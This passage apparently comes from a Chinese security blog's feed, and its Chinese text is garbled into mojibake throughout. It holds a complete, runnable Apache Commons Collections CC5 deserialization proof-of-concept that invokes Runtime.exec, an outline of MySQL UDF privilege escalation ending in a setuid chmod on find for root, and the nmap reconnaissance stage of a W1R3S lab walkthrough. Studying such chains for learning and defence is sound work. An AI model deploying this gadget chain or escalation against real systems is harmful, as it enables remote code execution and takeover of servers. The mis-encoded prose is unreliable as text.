id="5-è‡ªåŠ¨å¼•çˆ†ï¼šHashMapçš„ååºåˆ—åŒ–æœºåˆ¶"><a href="#5-è‡ªåŠ¨å¼•çˆ†ï¼šHashMapçš„ååºåˆ—åŒ–æœºåˆ¶" class="headerlink" title="5. è‡ªåŠ¨å¼•çˆ†ï¼šHashMapçš„ååºåˆ—åŒ–æœºåˆ¶"></a><strong>5. è‡ªåŠ¨å¼•çˆ†ï¼šHashMapçš„ååºåˆ—åŒ–æœºåˆ¶</strong></h4><p><strong>æœ€ç»ˆæœºå…³</strong>ï¼š<code>HashMap</code>çš„<code>readObject</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">map.put(entry, <span class="string">&quot;ä»»æ„å€¼&quot;</span>);  </span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">                TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">                    LazyMap.get()</span></span><br><span class="line"><span class="comment">                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.exec()</span></span><br><span class="line"><span class="comment">Requires:</span></span><br><span class="line"><span class="comment">commons-collections</span></span><br><span class="line"><span class="comment">This only works in JDK 8u76 and WITHOUT a security manager</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>CC6æ˜¯åˆ©ç”¨<code>TiedMapEntry</code>ä¸­çš„<code>hashCode</code>å‡½æ•°ï¼›CC5æ˜¯åˆ©ç”¨<code>TiedMapEntry</code>ä¸­çš„<code>toString</code>å‡½æ•°;ä¸ºä»€ä¹ˆè¿˜å¯ä»¥åˆ©ç”¨<code>toString</code>æ–¹æ³•ï¼›å…¶å®ä¹Ÿå°±æ˜¯å› ä¸º<code>toString</code>ä¹Ÿè°ƒç”¨äº†è°ƒç”¨äº†<code>getValue</code>æ–¹æ³•çš„åŸå› </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>BadAttributeValueExpException</code>è¿™ä¸ªç±»çš„readObjectè°ƒç”¨<code>valObj.toString()</code>,<code>valObj</code>çš„å€¼æ˜¯å¯æ§çš„ï¼›å°½ç®¡<code>BadAttributeValueExpException</code>æ²¡æœ‰å®ç° <code>Serializable</code> æ¥å£çš„æƒ…å†µä¸‹,ä»»ç„¶å¯ä»¥åºåˆ—åŒ–</p><p>POC</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;deadbeef&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">bclass</span> <span class="operator">=</span> badAttributeValueExpException.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> bclass.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ä¹‹å‰åˆ†æè¿‡äº†cc6 cc5åªä¸è¿‡å’Œcc6é“¾å­å…¥å£ç‚¹ä¸ä¸€æ ·&lt;/p&gt;
&lt;p&gt;å…ˆæ€»ç»“ä¸‹cc6&lt;/p&gt;
&lt;h4 id=&quot;1-é€ ç‚¸å¼¹ï¼šç»„è£…æ¶æ„ä»£ç é“¾æ¡&quot;&gt;&lt;a href=&quot;#1-é€ ç‚¸å¼¹ï¼šç»„è£…æ¶æ„ä»£ç é“¾æ¡&quot; class=&quot;headerlink&quot; title=&quot;1. é€ ç‚¸å¼¹ï¼šç»„è£…æ¶æ„ä»£ç </summary>
      
    
    
    
    <category term="java" scheme="https://gu0f3n.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://gu0f3n.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>MYSQL UDFææƒ</title>
    <link href="https://gu0f3n.github.io/2025/03/26/MYSQL-UDF%E6%8F%90%E6%9D%83/"/>
    <id>https://gu0f3n.github.io/2025/03/26/MYSQL-UDF%E6%8F%90%E6%9D%83/</id>
    <published>2025-03-26T12:37:26.000Z</published>
    <updated>2025-03-26T13:02:20.996Z</updated>
    
    <content type="html"><![CDATA[<p>udf å…¨ç§°ä¸ºâ€™user defined functionâ€™ï¼Œæ„æ€æ˜¯â€™ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°â€™ã€‚ç”¨æˆ·å¯ä»¥å¯¹<a href="https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93&spm=1001.2101.3001.7020">æ•°æ®åº“</a>æ‰€ä½¿ç”¨çš„å‡½æ•°è¿›è¡Œä¸€ä¸ªæ‰©å±•ï¼ˆwindowsåˆ©ç”¨dllæ–‡ä»¶ï¼Œlinuxåˆ©ç”¨soæ–‡ä»¶ï¼‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹ï¼Œå¾€MySQLé‡Œé¢æ·»åŠ ä¸€ä¸ªå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°å³å¯ã€‚</p><p>UDF ææƒå°±åƒ <strong>â€œåˆ©ç”¨æ•°æ®åº“ç»™è‡ªå·±å¼€åé—¨â€</strong>ã€‚ä¸¾ä¸ªä¾‹å­ï¼šå‡è®¾ä½ å·å·åœ¨å…¬å¸çš„æ‰“å¡æœºé‡Œè£…äº†ä¸€ä¸ªå°ç¨‹åºï¼Œè¿™ä¸ªå°ç¨‹åºæœ¬æ¥åº”è¯¥åªç”¨æ¥è®°å½•è€ƒå‹¤ï¼Œä½†ä½ æŠŠå®ƒæ”¹æˆäº†èƒ½ç›´æ¥å¼€è€æ¿åŠå…¬å®¤çš„é—¨ç¦å¡â€”â€”è¿™å°±æ˜¯ UDF ææƒçš„æ ¸å¿ƒé€»è¾‘ã€‚</p><p>æ•°æ®åº“å°±åƒä¸€å°æ‰‹æœºï¼ŒUDF å°±æ˜¯ç”¨æˆ·è‡ªå·±å®‰è£…çš„ Appã€‚æ­£å¸¸ App ç”¨æ¥å¬æ­Œã€èŠå¤©ï¼Œä½†é»‘å®¢è£…çš„ App å…¶å®æ˜¯å·å¯†ç çš„é—´è°è½¯ä»¶</p><h2 id="äºŒã€åˆ©ç”¨æ¡ä»¶"><a href="#äºŒã€åˆ©ç”¨æ¡ä»¶" class="headerlink" title="äºŒã€åˆ©ç”¨æ¡ä»¶"></a>äºŒã€åˆ©ç”¨æ¡ä»¶</h2><h4 id="1ã€å¸¸è§„æƒ…å†µï¼š"><a href="#1ã€å¸¸è§„æƒ…å†µï¼š" class="headerlink" title="1ã€å¸¸è§„æƒ…å†µï¼š"></a>1ã€å¸¸è§„æƒ…å†µï¼š</h4><p>1.1 mysqlé…ç½®æ–‡ä»¶secure_file_privé¡¹è®¾ç½®ä¸ºç©ºï¼Œï¼ˆå¦‚æœä¸ºNULLæˆ–&#x2F;tmp&#x2F;ç­‰æŒ‡å®šç›®å½•ï¼Œå³æ— æ³•è‡ªå®šä¹‰udfæ–‡ä»¶å¯¼å‡ºä½ç½®ï¼Œåˆ™æ— æ³•åˆ©ç”¨ï¼‰ï¼›</p><p>1.2 CREATEæƒé™ã€FILEæƒé™ï¼ˆrootç”¨æˆ·é»˜è®¤æ‹¥æœ‰æ‰€æœ‰æƒé™ï¼‰ã€‚</p><h4 id="2ã€ç‰¹æ®Šæƒ…å†µï¼š"><a href="#2ã€ç‰¹æ®Šæƒ…å†µï¼š" class="headerlink" title="2ã€ç‰¹æ®Šæƒ…å†µï¼š"></a>2ã€ç‰¹æ®Šæƒ…å†µï¼š</h4><p>2.1 INSERTæƒé™ã€UPDATEæƒé™ã€DELETEæƒé™ã€‚</p><h4 id="ææƒæ­¥éª¤ï¼ˆç®€å•ç‰ˆï¼‰"><a href="#ææƒæ­¥éª¤ï¼ˆç®€å•ç‰ˆï¼‰" class="headerlink" title="ææƒæ­¥éª¤ï¼ˆç®€å•ç‰ˆï¼‰"></a><strong>ææƒæ­¥éª¤ï¼ˆç®€å•ç‰ˆï¼‰</strong></h4><p><strong>ä¼ æ–‡ä»¶</strong>ï¼šæŠŠæ¶æ„ä»£ç ï¼ˆæ¯”å¦‚ <code>udf.so</code>ï¼‰ä¼ åˆ°æœåŠ¡å™¨ä¸Šï¼Œæ¯”å¦‚é€šè¿‡æ•°æ®åº“çš„â€œæ–‡ä»¶å†™å…¥â€åŠŸèƒ½</p><p><strong>å¯¼æ–‡ä»¶</strong>ï¼šç”¨ SQL å‘½ä»¤æŠŠæ–‡ä»¶å¤åˆ¶åˆ°æ•°æ®åº“çš„â€œæ’ä»¶ç›®å½•â€</p><p><strong>é€ å‡½æ•°</strong>ï¼šåœ¨æ•°æ®åº“é‡Œåˆ›å»ºä¸€ä¸ªâ€œè‡ªå®šä¹‰å‡½æ•°â€ï¼Œç»‘å®šè¿™ä¸ªæ¶æ„ä»£ç </p><p><strong>æ‰§è¡Œå‘½ä»¤</strong>ï¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆæ¯”å¦‚ <code>chmod u+s /usr/bin/find</code>ï¼‰ï¼Œç›´æ¥æ‹¿åˆ° root æƒé™</p><p>ç­‰ç¢°åˆ°å“åº”é¶æœº å†å»åšå¤ç°æ‰§è¡Œ ç°åœ¨å…ˆç®€å•äº†è§£ä¸€ä¸‹</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;udf å…¨ç§°ä¸ºâ€™user defined functionâ€™ï¼Œæ„æ€æ˜¯â€™ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°â€™ã€‚ç”¨æˆ·å¯ä»¥å¯¹&lt;a href=&quot;https://so.csdn.net/so/search?q=%E6%95%B0%E6%8D%AE%E5%BA%93&amp;spm=1001.2101.3001.</summary>
      
    
    
    
    <category term="ææƒ" scheme="https://gu0f3n.github.io/categories/%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="ææƒ" scheme="https://gu0f3n.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>lW1R3S 1.0.1</title>
    <link href="https://gu0f3n.github.io/2025/03/25/W1R3S%201.0.1/"/>
    <id>https://gu0f3n.github.io/2025/03/25/W1R3S%201.0.1/</id>
    <published>2025-03-25T08:24:26.000Z</published>
    <updated>2025-03-26T00:26:12.424Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸‹è½½å¥½é¶æœº </p><p>ç„¶åå…ˆåœ¨æœ¬åœ°è¿›è¡Œæ‰«æç¡®å®šé¶æœºçš„ipåœ°å€</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 192.168.205.0/24</span><br></pre></td></tr></table></figure><p>å‘ç°</p><p>Starting Nmap 7.95 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2025-03-25 04:03 EDT<br>Nmap scan report for 192.168.205.1 (192.168.205.1)<br>Host is up (0.0012s latency).<br>MAC Address: 00:50:56:C0:00:01 (VMware)<br>Nmap scan report for 192.168.205.2 (192.168.205.2)<br>Host is up (0.00089s latency).<br>MAC Address: 00:50:56:F7:4F:9C (VMware)<br>Nmap scan report for 192.168.205.136 (192.168.205.136)<br>Host is up (0.00074s latency).<br>MAC Address: 00:0C:29:19:D7:D3 (VMware)<br>Nmap scan report for 192.168.205.254 (192.168.205.254)<br>Host is up (0.00077s latency).<br>MAC Address: 00:50:56:E0:48:99 (VMware)<br>Nmap scan report for 192.168.205.128 (192.168.205.128)<br>Host is up.<br>Nmap done: 256 IP addresses (5 hosts up) scanned in 2.00 seconds</p><p>è¿™æ¡å‘½ä»¤ç­‰åŒäº </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure><p>Interface: eth0, type: EN10MB, MAC: 00:0c:29:e7:49:b2, IPv4: 192.168.205.128<br>WARNING: Cannot open MAC&#x2F;Vendor file ieee-oui.txt: Permission denied<br>WARNING: Cannot open MAC&#x2F;Vendor file mac-vendor.txt: Permission denied<br>Starting arp-scan 1.10.0 with 256 hosts (<a href="https://github.com/royhills/arp-scan">https://github.com/royhills/arp-scan</a>)<br>192.168.205.1   00:50:56:c0:00:01       (Unknown)<br>192.168.205.2   00:50:56:f7:4f:9c       (Unknown)<br>192.168.205.136 00:0c:29:19:d7:d3       (Unknown)<br>192.168.205.254 00:50:56:e0:48:99       (Unknown)</p><p>136æ˜¯æˆ‘ä»¬çš„é¶æœºåœ°å€</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å¯¹è¿™ä¸ªåœ°å€è¿›è¡Œä¸€ä¸ªtcpçš„æ‰«æ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sT --min-rate 10000 -p- 192.168.205.136 -oA  nmapscan/ports</span><br></pre></td></tr></table></figure><p>Starting Nmap 7.95 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2025-03-25 04:17 EDT<br>Nmap scan report for 192.168.205.136 (192.168.205.136)<br>Host is up (0.00034s latency).<br>Not shown: 55528 filtered tcp ports (no-response), 10003 closed tcp ports (conn-refused)<br>PORT     STATE SERVICE<br>21&#x2F;tcp   open  ftp<br>22&#x2F;tcp   open  ssh<br>80&#x2F;tcp   open  http<br>3306&#x2F;tcp open  mysql<br>MAC Address: 00:0C:29:19:D7:D3 (VMware)</p><p>å‘ç°4ä¸ªç«¯å£</p><p>-oA  nmapscan&#x2F;ports è¿™é‡Œæ˜¯ä¸ºäº†æ•°æ®åŒ–æ‰«æç»“æœ</p><p>å¦‚æœæ‰«æè¿‡ç¨‹ä¸­é‡åˆ°çš„ç«¯å£æ•°é‡è¿‡å¤§çš„æƒ…å†µä¸‹æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œä¸€ä¸ªç­›é€‰</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep open nmapscan/ports.nmap</span><br></pre></td></tr></table></figure><p>21&#x2F;tcp   open  ftp<br>22&#x2F;tcp   open  ssh<br>80&#x2F;tcp   open  http<br>3306&#x2F;tcp open  mysql</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">grep open nmapscan/ports.nmap |awk -F<span class="string">&#x27;/&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br><span class="line"><span class="number">21</span></span><br><span class="line"><span class="number">22</span></span><br><span class="line"><span class="number">80</span></span><br><span class="line"><span class="number">3306</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨æ¥ææƒç«¯å£ï¼ˆè¿™ä¸€åˆ‡éƒ½æ˜¯åŸºäºå¦‚æœæ‰«æå‡ºæ¥çš„ç«¯å£æ•°é‡è¿‡å¤§çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦ï¼Œè¿™é‡Œä¸ºäº†å…»æˆä¹ æƒ¯æ‰€ä»¥ç»†è‡´ä¸€äº›ï¼‰</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep open nmapscan/ports.nmap |awk -F&#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27;|paste -sd &#x27;,&#x27;</span><br><span class="line">21,22,80,3306</span><br></pre></td></tr></table></figure><p>å°†ç«¯å£æå–åˆ°ä¸€è¡Œ</p><p>å°†è¿™äº›èµ‹å€¼ç»™portçš„å˜é‡</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ports=$(grep open nmapscan/ports.nmap |awk -F&#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27;|paste -sd &#x27;,&#x27;)</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å¯¹å…¶è¿›è¡Œè¯¦ç»†ä¿¡æ¯æ‰«æ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sT -sV -sC -O -p21,22,80,3306 192.168.205.136 -oA nmapscan/detail</span><br></pre></td></tr></table></figure><p>-sVæ˜¯å¯¹ç½‘ç«™ä¿¡æ¯è¿›è¡Œæ‰«æï¼Œ-sCæ˜¯é»˜è®¤è„šæœ¬ -Oæ˜¯æ“ä½œç³»ç»Ÿ </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">21/tcp   open  ftp     vsftpd 2.0.8 or later</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:192.168.205.128</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content</span><br><span class="line">| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs</span><br><span class="line">|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)</span><br><span class="line">|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)</span><br><span class="line">|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:0C:29:19:D7:D3 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 5.1 - 5.15 (95%), Linux 3.13 - 4.4 (93%), Linux 3.8 - 3.16 (93%), Linux 4.10 (93%), Linux 3.4 - 3.10 (93%), Linux 3.10 (93%), Linux 3.13 - 3.16 (92%), Linux 4.4 (92%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.41 seconds</span><br></pre></td></tr></table></figure><p>åœ¨æ‰«æçš„è¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥è¿›è¡Œä¸€ä¸‹udpçš„ä¸€ä¸ªæ‰«æ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sU --top-ports 20 192.168.205.136 -oA nmapscan/udp</span><br><span class="line">[sudo] kali çš„å¯†ç ï¼š</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 05:22 EDT</span><br><span class="line">Nmap scan report for 192.168.205.136 (192.168.205.136)</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line">53/udp    open|filtered domain</span><br><span class="line">67/udp    open|filtered dhcps</span><br><span class="line">68/udp    open|filtered dhcpc</span><br><span class="line">69/udp    open|filtered tftp</span><br><span class="line">123/udp   open|filtered ntp</span><br><span class="line">135/udp   open|filtered msrpc</span><br><span class="line">137/udp   open|filtered netbios-ns</span><br><span class="line">138/udp   open|filtered netbios-dgm</span><br><span class="line">139/udp   open|filtered netbios-ssn</span><br><span class="line">161/udp   open|filtered snmp</span><br><span class="line">162/udp   open|filtered snmptrap</span><br><span class="line">445/udp   open|filtered microsoft-ds</span><br><span class="line">500/udp   open|filtered isakmp</span><br><span class="line">514/udp   open|filtered syslog</span><br><span class="line">520/udp   open|filtered route</span><br><span class="line">631/udp   open|filtered ipp</span><br><span class="line">1434/udp  open|filtered ms-sql-m</span><br><span class="line">1900/udp  open|filtered upnp</span><br><span class="line">4500/udp  open|filtered nat-t-ike</span><br><span class="line">49152/udp open|filtered unknown</span><br><span class="line">MAC Address: 00:0C:29:19:D7:D3 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 1.72 second</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰è¿›è¡Œnmap æ¼æ´è„šæœ¬è¿›è¡Œæ‰«æ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> sudo nmap --script=vuln -p21,80,22,3306 192.168.205.136 -oA nmapscan/vuln</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 05:25 EDT</span><br><span class="line">Nmap scan report for 192.168.205.136 (192.168.205.136)</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">21/tcp   open  ftp</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">| http-slowloris-check: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Slowloris DOS attack</span><br><span class="line">|     State: LIKELY VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2007-6750</span><br><span class="line">|       Slowloris tries to keep many connections to the target web server open and hold</span><br><span class="line">|       them open as long as possible.  It accomplishes this by opening connections to</span><br><span class="line">|       the target web server and sending a partial request. By doing so, it starves</span><br><span class="line">|       the http server&#x27;s resources causing Denial Of Service.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2009-09-17</span><br><span class="line">|     References:</span><br><span class="line">|       http://ha.ckers.org/slowloris/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="line">| http-enum: </span><br><span class="line">|_  /wordpress/wp-login.php: Wordpress login page.</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">MAC Address: 00:0C:29:19:D7:D3 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 322.12 seconds</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ²¡æœ‰å‘ç°å¯åˆ©ç”¨æ¼æ´ ddoså°±ä¸è€ƒè™‘äº† </p><p>ç„¶ååˆ†æåˆšåˆšçš„è¯¦ç»†æ‰«æ</p><p>21&#x2F;tcp   open  ftp     vsftpd 2.0.8 or later</p><p>21ç«¯å£ ftp ä½¿ç”¨çš„æ˜¯vsftpd åç¼€å¸¦dåŸºæœ¬ä¸Šå¯ä»¥ä½¿ç”¨åŒ¿åç™»å½•</p><p>ä¿¡æ¯æ”¶é›†å°±åˆ°è¿™ ç«¯å£æ‰«æ è¯¦ç»†ç«¯å£æ‰«æ udpæ‰«æ 